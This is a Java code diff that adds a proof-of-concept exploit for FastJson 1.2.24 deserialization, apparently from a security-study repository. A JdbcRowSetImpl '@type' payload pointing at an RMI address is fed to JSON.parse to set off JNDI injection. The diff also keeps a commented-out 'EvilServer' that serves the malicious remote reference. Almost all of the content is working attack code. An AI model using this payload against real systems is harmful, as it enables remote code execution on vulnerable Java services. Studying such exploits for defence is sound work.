@@ -1,4 +1,17 @@
-package JNDIInjection;
+package FastJson1224VULN.TemplatesImplBasedATTACK;
+
+import com.alibaba.fastjson.JSON;
+import com.sun.rowset.JdbcRowSetImpl;
+
+public class JDBCRowImplBasedEXP {
+    public static void main(String[] args) throws Exception {
+        JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
+//        jdbcRowSet.setDataSourceName("rmi://localhost:1099/remoteObj");
+        String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1099/remoteObj\", \"autoCommit\":true}";
+        JSON.parse(payload);
+        // JNDIServer must use ref!!!
+        /*
+        package JNDIInjection;
 
 import javax.naming.Context;
 import javax.naming.InitialContext;
@@ -19,6 +32,11 @@ public class EvilServer {
         ctx.rebind("rmi://localhost:1099/remoteObj",ref);
 
         System.out.println("Evil server is running...");
+
+    }
+}
+
+         */
 
     }
 }
